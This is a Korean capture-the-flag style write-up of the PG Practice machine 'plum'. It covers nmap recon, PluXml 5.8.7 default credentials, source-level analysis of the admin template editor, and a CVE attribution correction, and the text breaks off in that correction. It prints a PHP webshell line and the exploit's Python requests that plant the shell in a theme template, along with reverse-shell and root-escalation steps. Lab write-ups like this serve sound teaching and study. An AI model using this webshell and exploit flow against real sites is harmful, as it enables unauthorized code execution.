---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/payload/revshell
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.132.28
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2024-48138]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---
> [!info] PG Practice — **plum** · Intermediate
> **타겟** 192.168.132.28 · **OS** Debian 11 (bullseye), 호스트명 `plum` · **플래그 2개**
> **경로 요약** 80 PluXml 5.8.7 → **기본 자격증명 `admin/admin`** → **관리자 테마 템플릿 편집기로 웹셸 기록** → `www-data` → **`/var/spool/mail/www-data` 메일함에서 root 평문 비밀번호** → `su -` → root
> **CVE 표기 정정**: 익스플로잇 저자는 `CVE-2022-25018`을 인용하지만 **실제로 악용한 결함은 다른 것**이다(2-5).

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 이 노트는 [[_WRITEUP-STANDARD]]의 적대적 검증을 거쳤다. **읽어서 옮긴 것은 거의 전량 정확했다** — 스크린샷 11장이 모두 실재하고 본문과 **오탈자까지 일치**(`sophisicated`, 제목 끝의 군더더기 `"`), CVE-2022-25018 정정 주장도 1차 사료로 확인됐다. 무너진 것은 **실행해서 확인했어야 할 단정과, 인용을 잘라내며 만들어낸 인과**다.
>
> | # | 초판의 서술 | 판정 | 반증 근거 | 반영 위치 |
> |---|---|---|---|---|
> | 1 | "`su` 는 TTY를 요구한다. 순수 리버스셸에서는 **아예 동작하지 않는다**" + `[가정]` "PTY 업그레이드를 했거나 기록에서 누락됐다" | **반증됨** | util-linux `su` 는 TTY 없이 **stdin에서 비밀번호를 읽는다**(Kali 실측). 그리고 **이 노트가 붙인 `…142947.png` 가 본문을 반박한다** — 비밀번호가 화면에 **에코**됐다(TTY면 에코가 꺼진다). 메우려던 "기록의 공백"은 처음부터 없었다 | **4-3** · 6-⑤ · 7-19 |
> | 2 | "`$tpl='shell.php'` → `realpath` 가 `false` → **쓰기가 성립하지 않는다**" | **반증됨** | v5.8.7 소스에 **`$tpl='home.php'` 폴백 + `$filename` 재계산**이 있다. 쓰기는 성공하고 **첫 화면이 웹셸로 덮인다.** 결론(덮어쓰기)만 맞고 메커니즘·`if` 흐름·증상 예측이 전부 틀렸다 | **2-3** · 6-⑤ · 7-5 |
> | 3 | `plxUtils::write()` 를 `fwrite`+`chmod` 두 줄로 인용 | **인용 훼손** | 지워진 `else { fopen($filename,'w'); }` 가지 때문에 **`write()` 자체는 신규 생성이 가능**하다. 막는 것은 상류의 `realpath()` 다. 인용을 자르자 인과가 바뀌었다 | 2-2 |
> | 4 | "파일명 `46996` 은 **`searchsploit -m 46996`의 결과물**" | **반증됨** | `searchsploit -m` 은 `46996.**sh**` / `-rwxr-xr-x` / **3552**바이트를 낸다. 로컬 사본은 `46996` / `-rw-rw-r--` / **3557**바이트이고 내용도 다르다 → **exploit-db 웹 다운로드**. frontmatter의 `tech/enum/searchsploit` 태그를 **제거**했다 | **6-①** · frontmatter |
> | 5 | "CVE-2024-48138 — **9.8 CRITICAL** / 필요 권한 **admin**" | **한 줄 안의 자기모순** | 9.8 은 **CISA-ADP Secondary** 점수이고 벡터가 `PR:N`(권한 불필요)인데, 이 노트가 2-2에서 인용한 소스는 `checkProfil(PROFIL_ADMIN)` 으로 게이트된다. NVD Primary 점수는 **존재하지 않는다** | 2-5 |
> | 6 | "저장 로직이 v5.8.7~v5.8.23, **master까지 동일**. 보안 패치 커밋이 없다" | **master에서 반증** | master는 이 파일을 재작성해 **`in_array($tpl, $aTemplates)` 화이트리스트 + `exit`** 를 넣었다. 방어 관점 결론이 과장이었다 | 2-5 · 8장 |
> | 7 | "`sudo` 실패는 **기본적으로** root에게 메일" | **반증됨** | `sudoers(5)`: `mail_badpass` … *"This flag is off by default."* 기본 ON 은 `mail_no_user` 다. 관측된 `1 incorrect password attempt` 는 **이 박스가 켜둔** `mail_badpass` 템플릿이다 | 6-③ |
> | 8 | 익스플로잇 "**README** 도 경고를 달아뒀다" + `[가정]` "`vi` 로 리버스셸을 손봤을 것" | **출처 오기 + 반증** | 그 문장은 `pluxml.py` **76행 코드 주석**이다. 그리고 `git status --porcelain` 이 **빈 출력** — 업스트림 그대로다 | 2-6 (`[가정]` 은 이미 반증 사실로 교체돼 있었다) |
> | 9 | "`closed` 가 많으니 **아웃바운드도** 열려 있을 가능성" | **추론 불성립** | 인바운드 RST는 egress에 대해 아무 정보도 주지 않는다 | 1-1 |
> | 10 | 21Nails 출처 오귀속 · Exim 스펙 축자 인용 미세 차이 · 절 번호 오참조 2건 · AutoRecon을 금지 도구와 병렬 열거 · `gcc` 부재와 `/tmp/pwned` setuid 미표기 | **부정확 / 표기 누락** | 각 절에 개별 정정 | 6-①②③ · 3-3 · 7-7 · 9장 · 남긴 흔적 |
>
> **검증자 주장 중 둘은 되레 반증됐다** — ⑴ "메일함 mtime `Jun 29 01:12` 이 `04:57` 로그와 모순"이라는 지적은 **타임존 미환산**이었다(05:12:46 UTC = **01:12:46 EDT** — 정확히 일치. 6-③에 명시했다). ⑵ "exim에 40분을 태웠다는 서사"는 이미 이전 개정에서 실측 타임라인으로 교체돼 있었다.
>
> **터미널 블록·플래그·IP·자격증명은 한 바이트도 수정하지 않았다.** 고친 것은 설명 문장과 인과, 그리고 근거 등급 표기뿐이다.

## 0. 이 박스에서 배우는 것

- **"관리자니까 할 수 있는 일"이 곧 RCE다** — 테마/템플릿 편집기가 있는 CMS에서 관리자 자격증명은 **이미 셸**이다. 별도 취약점을 찾을 필요가 없다
- **애플리케이션의 진단 페이지가 공격 전제조건을 대신 확인해준다** — PluXml의 Information 화면이 `themes/ has write access`를 초록 체크로 알려줬다
- **자격증명은 메일함에 있다** — `/var/spool/mail/`·`/var/mail/` 은 리눅스 권한상승 열거의 표준 항목인데 자주 잊힌다
- **버전 숫자만 보고 익스플로잇을 던지면 안 된다** — 이 박스에서 Exim 익스플로잇이 실패했고, 그 이유는 **버전이 이미 패치 범위였기** 때문이다
- **실패한 익스플로잇도 흔적을 남긴다** — `/tmp/pwned` 라는 파일 하나로 무엇이 어떻게 실패했는지 역추적할 수 있다(6-①)

> [!tip] 시험 출제 가능성
>
> | 요소 | 시험 출제 가능성 | 이유 |
> |---|---|---|
> | **CMS 기본 자격증명 → 관리자 기능으로 RCE** | **매우 높음** | WordPress(테마 편집기)·Joomla(템플릿)·Drupal(PHP 필터)·Grav·PluXml 전부 동일 구조. **OSCP 웹 foothold의 대표 유형** |
> | **평문 자격증명 재사용 → `su`** | **매우 높음** | [[Codo]]·[[Scarlet]]·[[Zipper]]에서 반복됐다. 평문 비밀번호를 주우면 **root부터 시험**한다 |
> | **메일함(`/var/mail`)에서 자격증명 획득** | 중간 | 흔하지는 않지만 **열거 목록에 없으면 영영 못 찾는다.** 한 번 데이면 잊지 않는 유형 |
> | **SUID 바이너리 → 공개 익스플로잇** | 높음 (단 여기서는 **함정**) | `exim4`가 SUID로 보이면 반사적으로 CVE-2019-10149를 던지게 된다. **버전 확인 없이 던지면 실패한다** |
>
> 변형은 이런 모습이다 — PluXml 대신 WordPress `theme-editor.php`, 메일함 대신 `~/.bash_history`·`config.php`·백업 파일. **원리는 동일하다.**

> [!abstract] 이 노트의 무게중심
> 이 박스는 foothold가 쉽다(기본 자격증명 + 기성 익스플로잇). **진짜 학습 가치는 권한상승 구간의 시행착오**에 있다 — 산출물에 **실패한 Exim 익스플로잇(`46996`)** 이 남아 있고, 기존 노트에는 그 실패가 `"SUID 설정 파일 검색 -> exim4 실패"` 한 줄로만 적혀 있었다.
> 6장에서 **왜 실패했는지, 어떻게 알아챌 수 있었는지**를 소스와 재현 실험으로 복원한다.

---

## 1. 정찰

### 1-1. Nmap 원문

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ nnmap 192.168.132.28
# Nmap 7.98 scan initiated Mon Jun 29 12:41:32 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.132.28
Nmap scan report for 192.168.132.28
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: PluXml - Blog or CMS, XML powered !
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   65.25 ms 192.168.45.1
2   65.21 ms 192.168.45.254
3   65.73 ms 192.168.251.1
4   65.87 ms 192.168.132.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 29 12:41:58 2026 -- 1 IP address (1 host up) scanned in 26.15 seconds
```

> [!note] `nnmap` 은 개인 별칭이다 (상세: [[pyLoader]] 1-1)
> ```bash
> alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
> ```
> **시험장 머신에는 없다.** 아래 플래그를 손으로 칠 수 있어야 한다.

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 여기서는 22/80이라 기본 스캔으로도 잡힌다. 그래도 **생략하지 않는다** — 안 열려 있음을 확인하는 것 자체가 정보다 |
| `-sCV` | 기본 NSE + 버전 탐지 | **`http-title: PluXml`이 안 나온다.** 이 한 줄이 제품명을 확정해주고, 제품명이 곧 검색 키워드다 |
| `-Pn` | ping 생략 | PG 랩은 ICMP를 막는 경우가 있다 |
| `-A` | OS 추측 + traceroute | 여기서도 **틀렸다**(`MikroTik RouterOS`). 아래 경고 참조 |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔 26초 |
| `-oN nmap.log` | 저장 | 재실행 없이 재확인 |

> [!danger] `-A`의 OS 추측이 또 틀렸다 — 배너를 믿어라
> nmap은 `MikroTik RouterOS 7.2 - 7.5`를 후보로 냈다. 실제는 **Debian 11 (bullseye)** 이다.
> 근거는 배너의 **패키지 리비전**이다:
> ```
> OpenSSH 8.4p1 Debian 5+deb11u1     ← "deb11" = Debian 11 bullseye
> Apache httpd 2.4.56 ((Debian))
> ```
> **`deb11u1` 같은 접미사는 배포판과 메이저 릴리스를 거의 확정한다.** [[pyLoader]]에서 `3ubuntu0.1` → Ubuntu 22.04로 판정한 것과 같은 규칙이고, [[Codo]]에서 정리한 원칙이다.
>
> **이 판정이 왜 중요한가**: Debian 11이라는 사실이 **6장의 Exim 실패를 미리 설명해준다.** Debian 11의 exim4 패키지는 **4.94.2-7 계열**이고, 4.94.2는 CVE-2019-10149(4.87–4.91)의 **패치 범위 밖**이다. 배포판을 못 박아 뒀다면 그 익스플로잇을 던지기 전에 걸렀을 것이다.

> [!note] 포트가 22/80 둘뿐이고 나머지가 전부 `closed` 다
> `closed` = RST 응답 = **인바운드 경로에 패킷을 버리는 방화벽이 없다.**
>
> **⚠️ 여기서 "그러니 아웃바운드도 열려 있다"로 넘어가면 안 된다.** 초판이 그렇게 적었으나 **추론이 성립하지 않는다** — 인바운드 RST는 **들어오는 방향**의 정보이고, egress 정책에 대해서는 **아무것도 말해주지 않는다.** 인바운드 무필터 + 아웃바운드 화이트리스트는 흔한 구성이다.
> 결과적으로 4444 리버스셸이 붙은 것은 사실이지만, **결과가 맞았던 것과 추론이 성립하는 것은 별개다.** 아웃바운드는 실제로 던져봐야 안다 — 안 붙으면 **443·80·53** 순으로 갈아탄다([[Hawat]]에서는 443만 열려 있었다).
>
> 또한 nmap이 **25번(SMTP)을 보지 못했다**는 점을 기억해 두자 — 뒤에서 `netstat`로 확인하면 **`127.0.0.1:25`에 Exim이 살아 있다.** **루프백 전용 서비스는 외부 스캔에 절대 안 잡힌다.** 셸을 잡은 뒤 `netstat`/`ss`를 다시 돌리는 이유가 이것이다.

### 1-2. 웹 — PluXml

`http://192.168.132.28/` 이 PluXml 기본 블로그다. 관리 콘솔은 `/core/admin/`.

기본 자격증명 **`admin` / `admin`** 이 그대로 통했다.

![[Pasted image 20260629125057.png]]

> [!tip] CMS를 보면 기본 자격증명이 1순위다 — 브루트포스보다 먼저
> `admin/admin` · `admin/password` · `admin/<제품명>` · `root/root`. 3~5개만 손으로 시도한다.
> **통하면 몇 시간을 아끼고, 안 통해도 1분밖에 안 든다.** [[Codo]]·[[Astronaut]]·[[Levram]]·[[Crane]]에서 반복된 패턴이다.
> ⚠️ **브루트포스(`hydra`·`wfuzz`)는 시험에서 가능하지만 시간을 잡아먹는다.** 기본 자격증명 → 다른 서비스에서 주운 자격증명 재사용 → **그 다음에야** 브루트포스다.

### 1-3. Information 페이지 — 공격 전제조건을 앱이 대신 확인해준다

관리 콘솔의 **Information** 화면이 버전과 환경을 통째로 렌더한다.

![[Pasted image 20260629125819.png]]

| 항목 | 값 | 이 값이 왜 중요한가 |
|---|---|---|
| **PluXml version** | **5.8.7** (charset UTF-8) | CVE 판정의 출발점 |
| PHP version | **7.4.33** | 웹셸이 쓸 수 있는 함수의 범위 |
| 서버 | Apache/2.4.56 (Debian) | nmap 배너와 **교차 일치** |
| ✓ **`../../themes/ has write access`** | ★ | **템플릿 편집기가 파일을 실제로 쓸 수 있다는 확인**. 이 체크가 ✗였다면 익스플로잇은 실패한다 |
| ✓ `../../`, `data/configuration/`, `data/articles/`, `data/statiques/`, `data/medias/`, `plugins/` 쓰기 가능 | | 웹 루트 전체가 www-data 쓰기 가능 — **대안 경로가 많다** |
| ✗ **Apache URL Rewriting module mod_rewrite unavailable** | | **URL이 예쁘게 안 나온다.** 익스플로잇이 `/index.php?static1/static-1` 형태로 접근하는 이유 |
| ✗ GD library not installed | | 이미지 처리 없음 — 이미지 업로드 우회 경로는 없다 |
| ✓ XML library installed | | PluXml은 DB 대신 XML을 쓴다 |
| ✓ **Mail sending function available** | ★ | **로컬 MTA가 살아 있다.** 4장의 메일함 권한상승을 여기서 이미 예고한다 |
| N° of static pages: **1** | | 익스플로잇이 노리는 `static-1`이 바로 이 페이지다 |
| N° of users in session: admin | | 사용자는 admin 하나 |

> [!danger] 진단·상태 페이지는 정찰의 최고 효율 지점이다
> 이 화면 하나가 **버전 · PHP 버전 · 쓰기 가능 디렉터리 · 활성 모듈 · 메일 기능 가용성**을 전부 줬다. 디렉터리 브루트포싱 30분보다 이 페이지 30초가 낫다.
> **찾아야 할 이름들**: `Information`·`System Status`·`Site Health`(WordPress)·`phpinfo.php`·`info.php`·`server-status`·`/actuator/env`.
> [[Squid]]에서 `phpsysinfo`와 `testmysql.php`가 정확히 같은 역할을 했다 — **남이 만들어둔 진단 스크립트를 먼저 찾아라.**

> [!warning] 버전 판정 근거가 1개다 — 그래도 진행한 이유
> `5.8.7`의 근거는 **관리 콘솔이 렌더한 값 하나뿐**이다. 누적 원칙("독립 근거 2개": [[Hub]]·[[Levram]]·[[RubyDome]]·[[Squid]])에는 못 미친다.
> 보강하려면 `/CHANGELOG.md`·`/version`·정적 자원의 `?v=` 쿼리를 확인하면 된다.
> 다만 **이 박스에서는 버전 정확도가 결정적이지 않다** — 뒤에서 보듯 템플릿 편집기 RCE는 **릴리스 태그 5.8.7부터 5.8.23까지 저장 로직이 동일**해서 버전과 무관하게 동작한다(**2-5**. master는 다르다 — 같은 절 참조).

---

## 2. 취약점 분석

> [!abstract] 이 장에서 답할 질문 넷
> 1. **관리자 템플릿 편집기가 어떻게 코드 실행이 되는가** — 소스의 어느 줄이 무엇을 어디에 쓰는가
> 2. **왜 익스플로잇은 새 파일을 만들지 않고 `static.php`를 덮어쓰는가** — 이건 우연이 아니다
> 3. **왜 매 요청마다 CSRF 토큰을 새로 긁는가**
> 4. **이것은 정말 CVE-2022-25018인가** — 아니다

### 2-1. 배경 — PluXml은 DB가 없는 XML 기반 CMS다

PluXml은 MySQL 같은 DB 없이 **XML 파일로 글·설정을 저장**하는 경량 CMS다. 그 결과:

- **SQL 인젝션이라는 공격면이 아예 없다** — sqlmap을 꺼낼 일이 없다(시험 관점에서는 오히려 다행)
- 대신 **파일 시스템이 곧 데이터베이스**다. 웹서버 계정이 웹 루트에 쓰기 권한을 가져야 앱이 동작한다
- 그래서 **"임의 파일 쓰기"가 이 앱에서는 정상 기능**이고, 그것이 그대로 공격면이 된다

> [!note] 데이터 저장 방식이 공격면을 결정한다
> | 저장 방식 | 주 공격면 |
> |---|---|
> | RDBMS | SQLi → `INTO OUTFILE`/`DUMPFILE` ([[Squid]]·[[Hawat]]) |
> | **플랫 파일 / XML** | **파일 쓰기 권한 그 자체** · XXE · 경로 트래버설 ← 이 박스 |
> | 역직렬화 저장 | insecure deserialization |
>
> **"DB가 안 보인다"는 공격면이 없다는 뜻이 아니라 공격면이 다른 곳에 있다는 뜻이다.**

### 2-2. 취약 코드 — `core/admin/parametres_edittpl.php`

PluXml **v5.8.7** 원문이다:

```php
plxToken::validateFormToken($_POST);
$plxAdmin->checkProfil(PROFIL_ADMIN);          // PROFIL_ADMIN = 0, 관리자 전용

$tpl = isset($_POST['tpl'])?$_POST['tpl']:'home.php';
if(!empty($_POST['load'])) $tpl = $_POST['template'];

$style = $plxAdmin->aConf['style'];
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);
if(!preg_match('#^'.str_replace('\\', '/', realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/').'#'), str_replace('\\', '/', $filename))) {
	$tpl='home.php';
}
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);

# Traitement du formulaire: sauvegarde du template
if(isset($_POST['submit']) AND trim($_POST['content']) != '') {
	if(plxUtils::write($_POST['content'], $filename))
```

**데이터 흐름을 한 줄씩 따라간다:**

| 줄 | 무슨 일이 일어나는가 |
|---|---|
| `validateFormToken($_POST)` | CSRF 토큰 검증 (2-3에서 자세히) |
| `checkProfil(PROFIL_ADMIN)` | **관리자만 통과.** `admin/admin`이 통했으므로 무의미해졌다 |
| `$tpl = $_POST['template']` | **편집할 파일명을 클라이언트가 지정**한다 |
| `$filename = realpath(themes/<style>/<tpl>)` | 절대 경로 확정 |
| `preg_match('#^<themes 절대경로>#', $filename)` | **테마 디렉터리 밖으로 나가는 것만** 막는다 (경로 트래버설 방어) |
| `plxUtils::write($_POST['content'], $filename)` | ★ **본문을 가공 없이 그대로 파일에 쓴다** |

`plxUtils::write()` 의 실체는 이렇다 — **필터가 없다.** `core/lib/class.plx.utils.php` v5.8.7 원문(605행부터) 전문:

```php
	public static function write($xml, $filename) {

		if(file_exists($filename)) {
			$f = fopen($filename.'.tmp', 'w'); # On ouvre le fichier temporaire
			fwrite($f, trim($xml)); # On écrit
			fclose($f); # On ferme
			unlink($filename);
			rename($filename.'.tmp', $filename); # On renomme le fichier temporaire avec le nom de l'ancien
		} else {
			$f = fopen($filename, 'w'); # On ouvre le fichier
			fwrite($f, trim($xml)); # On écrit
			fclose($f); # On ferme
		}
		# On place les bons droits
		chmod($filename,0644);
		# On vérifie le résultat
		if(file_exists($filename) AND !file_exists($filename.'.tmp'))
			return true;
		else
			return false;
	}
```

> [!warning] 초판은 이 인용에서 `if/else` 분기를 지웠다 — 그 결과 2-3의 인과가 통째로 틀어졌다
> 초판은 `fwrite` 와 `chmod` 두 줄만 남겨 인용했다. 그런데 지워진 `else` 가지 — `fopen($filename, 'w')` — 는 **`write()` 자체가 신규 파일을 만들 수 있다**는 뜻이다.
> 신규 생성을 막는 것은 `write()` 가 아니라 **상류의 `realpath()`** 이고, 그것도 "막는" 방식이 초판의 서술과 다르다(2-3 정정).
> **인용을 잘라내면 인과가 바뀐다.** 소스는 판단에 필요한 분기까지 통째로 옮겨라.

**왜 저장된 내용이 PHP로 실행되는가:**

```
POST content ──→ plxUtils::write() ──→ themes/<style>/static.php
                     (필터 0, 확장자 검증 0)
                                              │
   공개 사이트 접속 → index.php → plxMotor/plxShow 가 테마 템플릿을 include
                                              ▼
                        저장된 <?php system($_GET['cmd']); ?> 가 PHP 파서에 의해 실행
```

**`eval()`이 필요 없다.** 테마 템플릿은 데이터가 아니라 **`include` 되는 PHP 소스 파일**이다. 파일 내용 = 코드다.

> [!danger] 확장자 검증이 없는 게 아니라, 있는데 `.php` 를 허용한다
> 유일한 확장자 화이트리스트는 **편집기 드롭다운 목록을 만드는 용도**이고, 거기에도 `.php`가 들어 있다:
> ```php
> $aTemplates=listFolderFiles($root, array('.php','.css','.htm','.html','.txt','.js','.xml'), $root);
> ```
> **쓰기 경로(`plxUtils::write`)에는 확장자 검사가 아예 없다.** 목록은 UI 편의일 뿐 보안 통제가 아니다.
>
> **일반화**: "드롭다운에 있는 것만 고를 수 있다"는 **클라이언트 측 제약**이다. 서버가 다시 검사하지 않으면 없는 것과 같다. **선택지가 제한된 폼을 보면 값을 직접 바꿔 POST해 보라.**

### 2-3. 왜 익스플로잇은 새 파일을 만들지 않고 기존 파일을 덮어쓰는가

익스플로잇 `pluxml.py`를 보면 **`static.php` 라는 기존 템플릿을 덮어쓴다.** `shell.php` 같은 새 파일을 만들지 않는다. 게으름이 아니라 **강제된 선택**이다.

답은 `realpath()` 에 있다. 다만 **초판이 적은 인과는 틀렸다** — 아래에서 소스 원문으로 바로잡는다.

v5.8.7 `parametres_edittpl.php` 의 해당 구간을 **줄을 빼지 않고** 옮기면 이렇다:

```php
$style = $plxAdmin->aConf['style'];
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);
if(!preg_match('#^'.str_replace('\\', '/', realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/').'#'), str_replace('\\', '/', $filename))) {
	$tpl='home.php';                                                                  // ← ★ 폴백
}
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);    // ← ★ 재계산
```

**`realpath()` 는 존재하지 않는 경로에 `false` 를 반환한다.** 재현해서 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ php -r 'var_dump(realpath("/tmp/definitely_does_not_exist_12345.php")); var_dump(realpath("/etc/hostname"));'
bool(false)
string(13) "/etc/hostname"
```

**`$tpl = 'shell.php'` 를 보내면 실제로 무슨 일이 일어나는가** — 한 단계씩:

| # | 평가 | 결과 |
|---|---|---|
| ① | `$filename = realpath(themes/<style>/shell.php)` | **`false`** (그런 파일이 없다) |
| ② | `str_replace('\\','/', false)` | `false` 가 문자열 문맥에서 **`""`** 로 캐스팅 |
| ③ | `preg_match('#^<themes 절대경로>#', "")` | **`0`** (빈 문자열에는 접두사가 없다) |
| ④ | `if(!0)` | **`true`** → 블록 진입 |
| ⑤ | `$tpl = 'home.php'` | ★ **파일명이 조용히 바뀐다** |
| ⑥ | `$filename = realpath(themes/<style>/home.php)` | ★ **유효한 절대 경로로 재계산된다** |
| ⑦ | `plxUtils::write($_POST['content'], $filename)` | ★ **쓰기 성공 — `home.php` 가 덮인다** |

> [!danger] **정정** — "쓰기가 성립하지 않는다"가 아니라 **첫 화면이 털린다**
> 초판은 여기에 이렇게 적었다: *"`$tpl = 'shell.php'` 로 보내면 `$filename = false` 가 되고, `plxUtils::write()` 의 `fopen(false, 'w')` 는 빈 경로 열기로 실패한다. **쓰기가 성립하지 않는다.**"*
> **소스가 반박한다.** `$filename` 은 `false` 인 채로 `write()` 에 도달하지 못한다 — **④⑤에서 `home.php` 로 폴백되고 ⑥에서 재계산**되기 때문이다. `false` 가 `write()` 까지 흘러가는 경로가 애초에 없다.
>
> **결론(임의 생성이 아니라 덮어쓰기)만 우연히 맞았고, 메커니즘·`if` 흐름·증상 예측이 전부 틀렸다.**
> 실전 차이가 크다 — 존재하지 않는 파일명을 넣으면 **아무 일도 안 일어나는 게 아니라, 사이트 첫 화면(`home.php`)에 페이로드가 심긴다.** 공격자에게는 오히려 **트리거가 더 쉬운** 결과다(`/` 만 열면 실행된다).
>
> **시험장 관점**: "새 파일명을 넣었더니 반응이 없다"고 읽으면 **이미 심긴 웹셸을 못 찾는다.** 반응이 없어 보이면 `home.php` 를 확인하라.

즉 이 결함은 **"임의 파일 생성"이 아니라 "기존 테마 파일 덮어쓰기"** 이고, **파일명을 잘못 넣으면 덮어쓰기 대상이 `home.php` 로 강제된다.**

> [!warning] 이 제약이 실전에서 뜻하는 것 — 사이트를 부순다
> 새 파일을 못 만드니 **멀쩡한 템플릿을 망가뜨려야** 한다. 익스플로잇이 원본 `static.php`의 내용을 통째로 코드에 박아두고 **웹셸만 끼워 넣어 다시 저장**하는 이유가 이것이다:
> ```python
> data = {'token': token, 'template': 'static.php', 'submit': 'Save the file',
>         'tpl': 'static.php', 'content': content + simple_web_shell + footer}
> ```
> **원본을 복원하려는 배려**이자, 사이트가 깨지면 관리자가 즉시 알아챈다는 실전 고려다.
> 실무 침투테스트에서는 **덮어쓰기 전에 원본을 반드시 백업**하고, 작업 후 되돌린다. 시험에서도 **랩을 망가뜨리면 리버트 후 처음부터**다.

**어떤 파일을 고를 것인가**도 판단이 필요하다:

| 후보 | 장단 |
|---|---|
| `home.php` | 첫 화면이라 **접근이 쉽지만 가장 눈에 띈다.** 그리고 **잘못된 파일명을 보내면 강제로 여기가 대상이 된다**(위 폴백 ⑤) |
| **`static.php`** | 정적 페이지 1개(`static-1`)에서만 렌더 — **눈에 덜 띄고 접근 경로가 명확** ← 익스플로잇의 선택 |
| `footer.php` / `sidebar.php` | 모든 페이지에 include돼 **어디서든 트리거 가능**하지만 그만큼 티가 난다 |

### 2-4. CSRF 토큰이 1회용이다 — 익스플로잇이 매번 다시 긁는 이유

`pluxml.py` 는 요청 전마다 페이지를 GET해서 히든 필드를 새로 파싱한다. 왜인가.

토큰 생성 (`core/lib/class.plx.token.php`, v5.8.7):

```php
public static function getTokenPostMethod($length=32, $html=true) {
    $token = substr(str_shuffle(self::TEMPLATE), mt_rand(0, self::TEMPLATE_LENGTH - $length), $length);
    $_SESSION['formtoken'][$token] = time();
    return ($html) ? '<input name="token" value="'.$token.'" type="hidden" />' : $token;
}
```

검증 — **여기가 핵심이다**:

```php
if(empty($_POST['token']) OR plxUtils::getValue($_SESSION['formtoken'][$_POST['token']]) < $limit) {
    unset($_SESSION['formtoken']);
    die('Security error : invalid or expired token');
}
unset($_SESSION['formtoken'][$_POST['token']]);   // ← 소비 즉시 폐기
```

**토큰은 1회용이다.** 그리고 실패하면 처벌이 가혹하다:

- 같은 토큰을 두 번 쓰면 → 세션에 그 키가 없다 → 조건 성립 → **`unset($_SESSION['formtoken'])` 로 세션의 토큰 전체가 날아가고** `die()`
- 즉 **한 번 실수하면 그 세션의 모든 폼이 죽는다.** 로그인부터 다시 해야 한다

> [!danger] 웹앱 자동화 3대 함정 — 이 박스는 1번에 정면으로 걸린다
> 1. **CSRF 토큰이 1회용 / 매 요청 갱신** ← 이 박스, 그리고 [[Squid]]의 phpMyAdmin
> 2. **세션 쿠키 미유지** — `requests.Session()` 필수 (익스플로잇도 `s = requests.Session()`을 쓴다)
> 3. **환경변수 프록시 개입** — `trust_env=False` ([[Squid]])
>
> 셋 다 **HTTP 에러가 아니라 "엉뚱한 페이지"** 로 나타나서 원인 찾기가 오래 걸린다.
> 여기서는 더 나쁘다 — **`die('Security error : invalid or expired token')` 라는 200 응답**이 온다. 상태 코드만 보면 성공처럼 보인다.
> **자동화가 이상하면 응답 본문을 파일로 통째로 저장해서 눈으로 봐라.** 누적 패턴 **"응답이 성공을 뜻하지 않는다"**([[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]])의 또 다른 얼굴이다.

그래서 익스플로잇의 저장 절차가 **2단계 POST**다:

```python
# ① 'load': 'Load'  — 편집기에 static.php를 불러온다. 응답에 새 토큰이 들어 있다
data = {'token': token, 'template': 'static.php', 'load': 'Load', 'tpl': 'static.php', 'content': content + footer}
r = s.post(url + edit_path, data=data, ...)
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name':'token'})['value']    # ← 새 토큰 추출

# ② 'submit': 'Save the file'  — 새 토큰으로 웹셸을 포함해 저장
data = {'token': token, 'template': 'static.php', 'submit': 'Save the file', 'tpl': 'static.php',
        'content': content + simple_web_shell + footer}
s.post(url + edit_path, data=data, ...)
```

**①의 목적은 파일을 불러오는 것이 아니라 새 토큰을 받는 것**이다.

### 2-5. ⚠️ CVE 표기 정정 — 이건 CVE-2022-25018이 아니다

익스플로잇 저장소 `erlaplante/pluxml-rce` 의 README는 이렇게 참조한다:

```
### PluXml 5.8.7 RCE
Used for practice on CTF machine, requires valid credentials.
##### References
https://nvd.nist.gov/vuln/detail/CVE-2022-25018
```

**그러나 1차 사료를 확인하면 어긋난다.**

NVD/MITRE의 CVE-2022-25018 원문:

> "Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into **static pages**."

발견자(Moritz Huppert)의 원 보고서는 **템플릿 편집기를 명시적으로 배제**한다:

